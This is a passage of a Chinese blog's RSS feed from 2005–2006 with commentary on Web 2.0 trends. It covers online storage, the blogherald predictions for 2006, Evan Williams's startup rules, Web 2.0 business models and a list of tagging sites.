1：更好和更便宜的在线文件存储（Better and Cheaper Online File Storage）。 我认为”better”中应该至少包括以下两点：faster, more convenient。 虽然以前曾看过keso等人强调的网络存储的重要，但在前一阵电脑崩溃之前，还真没意识到这种重要性。由于操作失误，我电脑所有分区都被格式化了，当真欲哭无泪。 不过还好，bloglines保存了我所有feeds，信件都在Gmail里，自己比较喜欢的照片都在Flickr里，365key/del.icio.us保存了喜欢的文章收藏。如果再说起来的话，QQ的网络硬盘还保存了我以前的IE收藏夹和一些照片。要不， 我真的就该郁闷死了。 Mike Arrington在文章中认为，在线文件存储应该可以通过鼠标拖放等傻瓜式操作实现，同时所有文件应该有RSS地址和标签（Tag），这样便于日后查找和分享。文件还应该有一个永久URL（permanent URL），当然定期备份也是个很重要因素了。 其实，现在已经有了不少在线的文件（文本）存储服务，例如writely、Openomy、Numsum等，不过速度还是个大问题。我希望有一天，电脑不需要硬盘，不需要操作系统，一切借助网络均可自由实现，这一天相信不会太远，等着Windows Live吧。至于这些服务要不要钱，我个人倒希望付费，只要服务商信誉足够，我不相信免费午餐会持续一辈子。 （说到这里，我突然希望现在的Windows里也能加入Tag特性，这样我就不用辛苦找某个文件了，要不baidu/google的硬盘搜索也可以支持tag啊。。。）
2 Blog/网站的邮件列表 Blog/website Email Lists 他这里提出的实际上是通过Email订阅RSS，他抱怨feedblitz不行。提到这个问题，我觉得rssfwd倒是个不错的选择，不过无法实现他的要求：统计功能。
Portable Reputations Arrington 提到了ebay的反馈机制，他指出这仅可以在Ebay内部实现。他希望在整个网络范围内，有一个信誉认证的体系。也就是希望能通过网络实现共享信誉数据，不过这似乎是个问题，哪个公司愿意无偿提供自己的数据？而且这涉及到隐私问题。 Arrington 说，opinity.com可以比较接近他提出的Portable Reputations。
Tailored Local Offers (via RSS) 这里说的是通过RSS买东西？
Facebook, in other countries 中国facebook的翻版？xiaonei也许算，不过我是没办法注册了。
Free Music 免费音乐 他认为总有一天，音乐会合法的免费（legally free），我对此倒不抱太大希望。不过也说不定，现在不就有了以creative commons协议发行的 唱片＆书了么？
Open Source Yellow Pages 开源黄页 千万不要告诉我是ucloo.com/啊，汗一个。yellowwikis也许算，不过中文版目前基本荒芜，希望有心的网友能像支持维基百科一样支持维基黄页，黄页应该不涉及政治问题吧，只要不把中南海电话公布出来。。
Podcast Transcriptions 这里谈到的实在是个新兴工种：抄写podcast，因为很多人没时间也不想去一一听所有podcast，而搜索引擎又目前无法索引podcast，因此他建议人工挑选。他说的应该就是podtranscript、castingwords这种网站吧。不过，我觉得在中国没啥前途。 今年google招聘抄录员是不是有啥用意呢，而且yahoo也已经推出了podcast搜索。
Decentralized Review Aggregation 通过Rss、tag聚合用户对某产品的评价</description>
    </item>
    
    <item>
      <title>2006年十大web2.0预言</title>
      <link>http://example.org/2006/01/27/2006e5b9b4e58d81e5a4a7web20e9a284e8a880/</link>
      <pubDate>Fri, 27 Jan 2006 11:57:20 +0000</pubDate>
      
      <guid>http://example.org/2006/01/27/2006e5b9b4e58d81e5a4a7web20e9a284e8a880/</guid>
      <description>又到年关，又是一个总结和预言的时候。我不喜欢预言什么，永远牢记孔夫子的教诲：述而不作。还是转述别人的预言吧。
blogherald，某些人或许会将它翻译为博客先驱，怎么叫无所谓，我也不在乎。这个网站昨日（12月27日）发表了一篇2006年十大预言，这里给各位一一道来。
十大预言
Technorati将被收购。Technorati大家该不会陌生吧。在没看内容之前，我私下认为Technorati应该被Yahoo！收购，居然blogherald和我想的一样。Yahoo!看样子注定要成为Web2.0killer了。只可惜Flickr和Del.icio.us被收购后三天两头宕机，yahoo还得多注意才是。 SixApart不会被出售。blogherald预言SixApart可能在2006年进行IPO（首次公开募股），然后在Nasdaq上市，预计市值将达到2亿美元！ Nick Denton将出售Gawker Media。尽管Nick Denton曾多次声明不会出售Gawker Media,不过世事难料，就像大多数人想不到mop收购donews一样。 MSN Spaces用户将超过1亿。这个似乎可以实现。 blog数量将达到4亿。今年７月，blogherald的统计数据是：全球大约有7000万个网志。 blog网络将得到巩固 blog广告将（再次）繁荣 针对blog的规则将更多。这个，我想中国blogger最有发言权了。 政治blog将继续失去在blog圈的影响力。 将新出现150家web 2.0公司，但是将以全军覆没告终。 来源 Technorati : web2.0, website skii, 收购, 预言</description>
    </item>
    
    <item>
      <title>Web2.0创业的10条戒律</title>
      <link>http://example.org/2006/01/26/web20e5889be4b89ae79a8410e69da1e68892e5be8b/</link>
      <pubDate>Thu, 26 Jan 2006 11:13:47 +0000</pubDate>
      
      <guid>http://example.org/2006/01/26/web20e5889be4b89ae79a8410e69da1e68892e5be8b/</guid>
      <description>Evan Williams是Blogger的创始人，也是podcast服务网站Odeo的创始人和CEO。他根据自己的体会，列出了Web创业应该遵循的10条戒律（Ten Rules for Web Startups），摘录并评注如下：
收缩：专注于一个尽可能小的可能存在的难题，而你又能够解决这个难题。不要想着什么都做，贪多嚼不烂，搞不好就成了模仿者。小可以变大，船小好调头，小可以带给你很多优势，缝隙市场可以变成一个大市场。不要试图把1亿上网用户都当成你的用户，没用，能真正解决一部分用户的一部分需求，就足够你玩儿的。 差异：要记住很多人都在做着跟你一样的事情，而其中一个是Google。在这个市场上，专才比通才有用。不一定要做多么领先的事情，寻常的事情你同样可以做得跟别人不一样，比如Google。起名字也不要用那些通用词汇，比如像博客网、中国博客网、亚洲博客网、世界博客网之类的，太多了没人分得清谁是谁。 随意：随意的网络要大于刻意的网络，因为人们还要生活。创建一种服务让它适应并对人们每天的生活有所助益，而不要要求太多的承诺或改变他们的身份。放轻松，很多时候，偶然的需要让你的服务更有价值，就像Skype上偶然发生的对话。既然生活本身就是随意的、偶然的，不要总是试图限制用户。 挑剔：这一点适用于很多方面：服务的特性、员工、投资者、合作伙伴、记者采访等等。如果感觉某样东西不太对劲，就放一放。Google最强大的力量之一，就是他们乐于对机会、快钱、可能的雇员以及交易说不。但很多人太心切，太怕错过这村没这店，所以往往来者不拒，最终将会后悔。 以用户为中心：用户体验就是一切。你的整个公司都必须建立在这上面，如果你不懂什么叫以用户为中心的设计，赶快学，雇用懂的人。把对的特性做对，远超过添加一百个特性。Ajax是为了让网站更互动，而不是因为它很性感。API是为了让开发者更容易为用户增加价值，而不是为了去取悦geek们。 自我本位：伟大的产品从来都是来自一个人自身的渴求。创造你自己需要的产品，成为你自己产品的用户，雇用你的产品的用户，按你自己的愿望改善它。另一方面，避免在费用、用户、或者有可能妨碍你改善产品等方面，跟大公司做交易。因为你小他们大，你很难说不。 饥渴：有选择永远好过没选择，最好的办法就是有收入。要为你的产品设计出收费模式并在6个月内开始有进项，这样你才会有市场费用。而且，有收入也会让你在融资或收购谈判中，处于更有利的位置。不过在中国可能没这么简单，为了赚钱而让服务变形的事总是在发生着。 苗条：保持低成本是一种Web创业智慧。能使用互联网上现有的服务，就不要花钱买。如果你希望被大公司收购，就更不能让自己显得很庞杂，小公司更容易被收购。Tim O’Reilly说过，如果你看到一家公司在市场活动上花很多钱，你可以肯定地知道，这不是一家Web 2.0公司。充分利用互联网现成的资源，也是一种能力。 灵活：要学会改变计划。Pyra最初要做的是一个项目管理程序，而不是Blogger。Flickr最初要做的是游戏。Ebay最初也只是想销售拍卖软件。最初的设想几乎永远都是错的。一开始就认定自己是对的，很可能撞上南墙。要把创业过程，变成一个BETA过程，不断debug，不断调整，不断改进。 平衡：初创公司是什么样？目光迷离、睡眠不足、垃圾食品充饥、咖啡提神……还有呢？要知道，自然要求健康的平衡，当平衡成为你的公司的一部分，你就拥有了一样秘密武器。需要玩儿命，也需要玩儿。一个充满活力的平衡的团队，也会给人更多的信任和期待。 谨慎（这个是额外的奖励）：不要拿上面的戒律当成金科玉律，凡事总有例外。 转自:http://technorati.com</description>
    </item>
    
    <item>
      <title>熊川：WEB2.0商业模式才刚开始</title>
      <link>http://example.org/2006/01/26/e7868ae5b79defbc9aweb20e59586e4b89ae6a8a1e5bc8fe6898de5889ae5bc80e5a78b/</link>
      <pubDate>Thu, 26 Jan 2006 11:02:49 +0000</pubDate>
      
      <guid>http://example.org/2006/01/26/e7868ae5b79defbc9aweb20e59586e4b89ae6a8a1e5bc8fe6898de5889ae5bc80e5a78b/</guid>
      <description>三联的尚进见多识广，Y经常说:”web2.0，没戏”!
Y一幅言之凿凿的样子，不由得你不信。
最近有空反思了一下web2.0的商业模式，分析如下:
一、RSS有商业模式吗?(feedburner、feedsky网站有商业模式吗?)
这个问题看上去有点可笑，但事实上，这一直是feedburner饱受争议的地方。
feedburner为大量的RSS源的提供统计、优化和管理，而且试图通过这种方式建立RSS广告的商业模式。
虽然feedburner看上去似乎可能产生商业价值，但我认为这种模式也可能存在一些严重的缺陷。
1、所有人都在讨论长尾，但一个真正的长尾也许是需要一个足够强大的技术支撑的。feedburner其实是很难产生一个真正的长尾的，虽然看上去很像。如果说pagerank可以产生长尾，那么feedburner的统计和分析实在是简单得不能再简单。
2、feedburner是以出版者中心的，而目前为止，所有成功的网络巨头都是为尽可能多的人服务，而feedburner试图为少数高端用户服务，但众所周知，这部分高端用户都是”蛀虫”，他们是互联网上最难为服务买单的人。
3、到目前为止，feedburner没有显示出任何真正独创性的技术。
4、到目前为止，feedburner真正挣到的钱应该极少，我不相信有多少人会为feedburner的smooth服务而付费，就算有，那也太少了，而且与”搏傻”原则背道而驰。
5、目前为止，feedburner没有提供任何信息交叉，它即没有检索，也没有分类，甚至连按字母表排列的feed索引也没有。也许正是这样，大家乐于使用feedburner，它实在让人放心，它不会把你的东西拿着像新浪或者BOKEE一样随意使用内容源而不会给内容源的创造者任何收益。
这些态度使feedburner看上去不象一家会短期内挣钱的公司，它象一家值得你信赖的邮局，为成千上万的内容源提供RSS的渠道优化和增值服务，而且绝大多数服务是免费的。
RSS的确很有前途，但它只是基础，建立有效的商业模式有待时日，feedburner和feedsky网站无疑都是很”无私”的公司，为大家提供服务，不辞辛苦，值得表扬。
微软就聪明得多，知道RSS是好东西，而且有助于它打败GOOGLE(因为RSS可以很大程度上越过搜索引擎，建立信息源与受众更为直接的联系)，微软轻松推出了SSE，完善RSS体系，为这个还有待完善的体系加上最后的砖瓦，并且为在windows体系中建立更好的应用做好准备。
二、BLOG有商业模式吗?(BLOGCN、BLOGBUS、DONEWS)
这个问题估计已经讨论了10的N次方回了。
简单理解，BLOG就象邮箱，和RSS、SNS等WEB2.0技术一样，是基础服务，但门户光有邮箱能挣钱，能上市吗?
无线增值算一种赢利的模式吧，我估计所有BSP给VC的计划里都把这当成赢利模式的一种了吧，但BSP们还没做大，就有一帮SP开始直接推”移动BLOG”。
想想当年邮件服务商怎么收钱，SOHU们刚开始不是也打出移动邮件之类的口号吗?
不可否认，刚开始收了一些钱，但后来呢?
邮件是种基础服务，它主要是聚集人气，门户们今天猛推自己的BLOG不也就是图个人气吗，他们对BLOG的理解比BLOGCN、BLOGBUS、DONEWS更深吗?不见得。
但门户们可能更容易把人气转化为钱，因为它有很多信息可以交叉，很多服务可以增值。
这才是最要紧的，这也是为啥BOKEE赶着要平台化的。
三、SNS有商业模式
不管是LINKIST、天际等号称专业人士的，还是CYWORLD这样交友保持圈子的，还是圈网中国这样四不象的，都还没有找到足够好的商业模式来挣钱。
想学CYWORLD的也许会遇到QQ，QQ就是中国的CYWORLD，而且比CY好十倍，除了延时性这一点做得不够好。如果QQ的ZONE能有所进展，CY在中国不会有什么前途。
四、不管好坏，有商业模式的:
MYSPACE:
把BLOG和SNS结合起来，把明星和娱乐当成tag来组织分类用户，绝对是值得灵活学习的榜样。
商业模式?说不上吧，但人气烘得旺，好卖。
Flickr
又一个成名web2.0优等生，把一个图像在线存储用多种web2.0方式结合得比较完美，当然好卖。
uuzone:
把各种元素结合得不错，一直在变化。
问题是:一上来就告诉我”朋友圈+小圈子+在线像册+在线编辑+与众不同的BLOG+手机轻松玩转+高品质IP电话+费用全免”
商业模式?着急挣钱的心态已经在页面上显露无疑，堆积的服务是否缺乏主线，搞不懂这网站到底是干么子的。
baidu贴吧
不少人觉得这是百度最好的产品，结合BBS和tag、搜索，满足了一批低端用户的需要。
商业模式:用tag分好类的受众无疑为广告提供了更精确的目标，也为提供进一步细分受众的服务起到帮助。
网摘:
能再快点吗?365key如果能再快点我就用，几次试图使用都因为太慢而放弃。
商业模式:如果google的网摘够快够好用，也许会很喜欢这一工具，因为的确面临保存大量资料的问题，但本地搜索似乎已经完成了部分网摘的功能，微软也可能进一上完善这一功能。
Delicious
它过于高估用户分享的热情，RSS及OPML应该会完全取代它。
豆辨:
它的确有商业模式，虽然可能并不是一个好的商业模式，
过于精巧，难于长大，但不排除作者能够有新的开发计划将其放大。
用书和文化产品做tag来分类用户，结合了BLOG的元素，但又有一定主题，SNS也能很好的融合。
用了一阵，没什么互动的感觉，人气有待发展，显得高端，人气可能受影响。
五、总结一下:
国内BLOG、SNS、RSS等web2.0主角都还缺乏真正的商业模式，单纯做BSP是没有模式的，单纯做RSS也是没有模式的，单纯做SNS还是没有模式。
商业模式是十分灵活的，需要一定的想象力，在商业上要有独到的东西。
首先要好用，为用户提供某种服务，解决其实际需要，并由此吸引到相当高的人气。
从目前”成功”的一些web2.0公司看，被收购的居多，BLOG、SNS的都有，但BLOG、SNS的前途还是很远大的，因为它们远未定型，从一些基础的出发点看，它们的变数还很大，绝非只是目前看到的”有影响力的个人媒体”。
RSS的前景也是很有想象空间的，虽然前面对feedburner目前的模式进行了质疑，但它与BLOG、SNS、电子商务的结合，可能产生出更具互动性、更具原创性的新型商业模式。
它需要技术、想象力、理论思维的结合
转自:http://technorati.com</description>
    </item>
    
    <item>
      <title>web2.0时代tag网址大全</title>
      <link>http://example.org/2006/01/26/web20e697b6e4bba3tage7bd91e59d80e5a4a7e585a8/</link>
      <pubDate>Thu, 26 Jan 2006 09:40:55 +0000</pubDate>
      
      <guid>http://example.org/2006/01/26/web20e697b6e4bba3tage7bd91e59d80e5a4a7e585a8/</guid>
      <description>Glendor试图解决深层的web问题. RawSugar是一款刚刚发布2个月的社会性搜索引擎, 内容来自于用户的贡献和智慧. 公测2个月来, 已有135000个URL被Tag.功能:1. Tag, 用户可以对任何URL进行TAG, 以方便即时查找此URL;2. Publish, 用户可以发布自己的目录(Directory), 并与其他用户共享;3. Search, 用户可以根据主题, 组别, 和成员进行搜索. Kayak是一个专业搜索网站，提供机票、酒店、汽车租赁等搜索服务 Jookster是一个2.0的新颖的搜索引擎, 它优先对有用户经过bookmark的页面进行关键词的分析, 然后将这些页面置于搜索结果的首要位置, 其他一般的搜索结果页面紧随其后.该服务的核心是, 当你执行搜索的时候, 你还可以把搜索结果跟你的朋友和朋友的朋友bookmark过的页面联系起来. LibraryThing是一个给书tagging的网站. Podzinger能搜索播客的搜索引擎, 通过文字或术语搜索, 可以在线播放此播客或下载. 采用了BBN技术! Listal, 该站还可以给DVD, 游戏和音乐打TAG. 如果光是给书打TAG的话, 还是建议使用librarything. Gada.be最近对URL结构进行了调整, 以让内容更好地倍搜索引擎收录.
这款基于tag的搜索引擎受到了很多人的关注, 很快成了网民进行研究搜索的工具站点, 特别在图片搜索领域!
tagalag是一个通过朋友的邮件地址Tag朋友的一个网站. Tag朋友, 发展朋友关系, 结合博客, 相片功能, 和RSS 推广自己, 并不断发现志同道合者. 个人资料中包含有地理信息. Technorati Currently tracking 22.9 million sites and 1.8 billion links.Technorati is the authority on what’s going on in the world of weblogs. Tagworld乍一看有点类似Myspace和 Tagged, 其实它的功能远远不止这些!</description>
    </item>
    
    <item>
      <title>lamp,weblucene,awstats</title>
      <link>http://example.org/2005/12/31/lampwebluceneawstats/</link>
      <pubDate>Sat, 31 Dec 2005 18:19:50 +0000</pubDate>
      
      <guid>http://example.org/2005/12/31/lampwebluceneawstats/</guid>
      <description></description>
    </item>
    
  </channel>
</rss>
